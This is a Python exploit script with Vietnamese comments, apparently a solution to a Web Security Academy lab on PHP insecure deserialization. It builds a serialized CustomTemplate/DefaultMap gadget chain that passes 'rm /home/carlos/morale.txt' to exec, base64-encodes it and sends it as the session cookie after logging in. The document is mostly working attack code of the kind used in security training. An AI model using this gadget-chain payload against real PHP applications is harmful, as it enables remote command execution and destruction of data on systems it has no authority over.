'''
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"

Đâu tiên __wakeup() sẽ được gọi do hàm unserialize() được gọi trước đó.
-> Sau đó nó sẽ gọi đến hàm build_product() 
-> Hàm này sẽ gọi đến Product với hai đối số là default_desc_type và desc.Sau đó nó cố gắng tìm nạp default_desc_type từ Defaultmap.
-> Vì Defaultmap ko có thuộc tính này nên __get() được gọi và dùng default_desc_type là đối số.
-> hàm call_user_func được gọi với giá trị callback và name. 


'''

import requests
import urllib
import base64

url = "https://acd41f0b1f898b33c0fa3a1000990096.web-security-academy.net"

def encode_bs4(e):

	sample_string_bytes = e.encode("ascii")  
	base64_bytes = base64.b64encode(sample_string_bytes)
	base64_string = base64_bytes.decode("ascii")

	return base64_string

def slove(url):

	s = requests.session()

	data = {"username": "wiener", "password": "peter"}
	r1 = s.post(url+ "/login", data=data)
	
	
	d = r'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
	payload = encode_bs4(d)
	query = urllib.parse.quote_plus(payload)
	exploit = s.get(url + "/", cookies={'session': query})

	print(exploit)

slove(url)